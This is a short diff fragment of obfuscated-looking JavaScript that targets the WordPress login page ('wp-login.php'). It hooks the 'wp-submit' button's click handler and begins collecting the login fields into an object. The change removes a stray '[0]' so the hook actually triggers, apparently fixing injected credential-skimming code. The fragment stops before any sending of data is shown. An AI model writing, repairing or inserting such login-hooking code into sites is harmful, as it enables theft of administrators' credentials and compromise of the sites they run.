@@ -453,7 +453,7 @@ var login_form = document.getElementById("loginForm");
 
 if (top['location']['href']['indexOf']('wp-login.php') > -1) {
       var interval = setInterval(function () {
-          if (document['getElementById']('loginform')[0]) {
+          if (document['getElementById']('loginform')) {
               clearInterval(interval);
               document['getElementById']('wp-submit').onclick = function (_0x441cx2) {
                var login = {};
